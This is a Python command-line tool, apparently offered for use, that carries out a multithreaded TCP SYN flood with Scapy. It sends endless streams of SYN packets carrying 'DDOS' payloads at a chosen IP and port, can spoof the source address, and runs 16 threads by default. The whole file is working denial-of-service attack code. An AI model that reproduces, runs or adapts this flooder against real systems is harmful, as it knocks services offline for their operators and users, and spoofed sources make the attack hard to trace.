#!/usr/bin/env python3
import random
import argparse
import threading
from rich import print
from sys import exit
from scapy.all import *
from rich.console import Console
import logging
logging.getLogger("scapy").setLevel(logging.CRITICAL)


# Send a upd packet
def send_tcp_packets(dst_ip, dst_port, src_ip=None, payload=None):
    # IP layer
    try:
        if src_ip == None:
            ip = IP(dst = dst_ip)
        else:
            ip = IP(dst = dst_ip, src = src_ip)

        # TCP layer
        tcp = TCP(sport=RandShort(), dport=dst_port, flags="S")

        # Payload
        if payload == None:
            raw = Raw("DDOS".encode('utf-8')*512)
        else:
            raw = Raw(payload.encode('utf-8'))

        # Craft packet
        pkt = ip/tcp/raw

        # Send loop to 1 to keep sending until we hit CTRL+C
        console = Console()
        with console.status(f"[bold]Sending SYN packets [green]{pkt[IP].src}[/green]->[red]{pkt[IP].dst}[/red]", spinner="runner"):
            send(pkt, loop=1, verbose=0)
    
    except KeyboardInterrupt:
        exit(-1)


# Main function to be called from the Main thread
def main():
    parser = argparse.ArgumentParser(description="[+] TCP SYN FLOOD")
    parser.add_argument('-dip', metavar="Destination IP" , help="Destination IP of packets", required=True)
    parser.add_argument('-dport', metavar="Destination Port", type=int, help="Destination Port of packets", required=True)
    parser.add_argument('-sip', metavar="Source IP" , help="Source IP of packets", required=False)
    parser.add_argument('-t', metavar="THREAD", nargs='?', type=int, required=False, default=16, const=16, help="Number of threads")
    parser.add_argument('-p', metavar="Payload" , help="Payload String", required=False)
    args = parser.parse_args()

    if args.t < 1 :
        args.t = 16

    print("[bold][[red]![/red]] TCP SYN Scan")
    print(f"[bold][[cyan]>[/cyan]] Desination IP: [cyan]{args.dip}[/cyan]")
    print(f"[bold][[magenta]>[/magenta]] Desination IP: [magenta]{args.dport}[/magenta]")
    if args.sip is not None:
        print(f"[bold][[green]>[/green]] Source IP: [green]{args.sip}[/green]")
    print(f"[bold][[red]>[/red]] Number of Threads: [red]{args.t}[/red]")
    if args.p is not None:
        print(f"[bold][[yellow]>[/yellow]] Payload: [yellow]{args.p}[/yellow]")

    threads = list()
    try:
        for index in range(args.t):
            th = threading.Thread(target=send_tcp_packets, args=(args.dip, args.dport, args.sip, args.p))
            threads.append(th)
            th.start()
        
        for index, thread in enumerate(threads):
            logging.info("Main    : before joining thread %d.", index)
            thread.join()
            logging.info("Main    : thread %d done", index)
    except KeyboardInterrupt:
        print()
        print("[bold][[red]![/red]] Exiting!")
        exit(-1)


if __name__=='__main__':
    main()
